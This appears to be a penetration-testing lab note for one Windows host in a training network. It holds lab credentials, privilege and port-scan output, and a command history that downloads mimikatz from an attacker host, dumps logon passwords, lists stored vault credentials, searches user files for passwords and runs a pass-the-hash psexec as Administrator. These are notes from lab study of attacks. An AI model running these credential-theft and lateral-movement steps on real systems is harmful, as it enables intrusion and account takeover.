# 172.16.X.82
# Navigation
- [Summary](#summary)
- [Flags](#flags)
- [Accounts](#accounts)
- [Enumeration](#enumeration)
    - [NMAP](#nmap)
    - [Local Users](#local-users)
    - [Local Groups](#local-groups)
    - [System Info](#system-info)
    - [Routes](#routes)
    - [Netstat](#netstat)
    - [Environment Vars](#environment-vars)
    - [Domain Controller Info](#domain-controller-info)
- [Services](#services)
    - [API Endpoints](#api-endpoints)
- [Command History](#command-history)
# Summary
-
# Flags    
`Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include local.txt,proof.txt`

- C:\Users\Administrator\Desktop\proof.txt
# Accounts
### yoshi / Mushroom!
`xfreerdp3 /u:yoshi /p:Mushroom! /v:172.16.152.82`   
`whoami /priv`
```
Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```
`whoami /groups`
```
Group Name                                 Type             SID          Attributes                                     
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288 
```
# Enumeration
## NMAP
`sudo nmap -sV 192.168.141.97 --top-ports 1000`
```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
`sudo nmap -A -T4 -p- 172.16.213.10`
```

```
## Local Users
`Get-LocalUser`
```

```
## Local Groups
`Get-LocalGroup`
```

```
## System Info
`systeminfo`
```

```
## Routes
`route print`
```

```
## Netstat
`netstat -ano`
```

```
## Environment Vars
`Get-ChildItem Env:`
```

```
## Domain Controller Info
`nltest /dsgetdc:medtech`
```

```
# Services    
## API Endpoints
`gobuster dir -u http://192.168.159.121:80 -w /usr/share/wordlists/dirb/big.txt -p pattern`
```

```

# Command History
```c
    wget http://192.168.45.219/mimikatz.exe -OutFile mimikatz.exe
    // ran mimkatz with standard logonopasswords
    cmdkey /list
    vaultcmd /listcreds:"Web Credentials" /all
    Get-ChildItem -Recurse -Include *.txt,*.xml,*.ini,*.bat,*.ps1 -Path C:\Users\ | Select-String -Pattern "password", "pass", "pwd"
    // C:\Users\Administrator.MEDTECH\Searches\hole.txt
    //leon / rabbit!
    // log in as system
    sudo impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:c33b5cf9fa1b1bb4894d4a6cd7c54034 medtech/Administrator@172.16.152.82
```
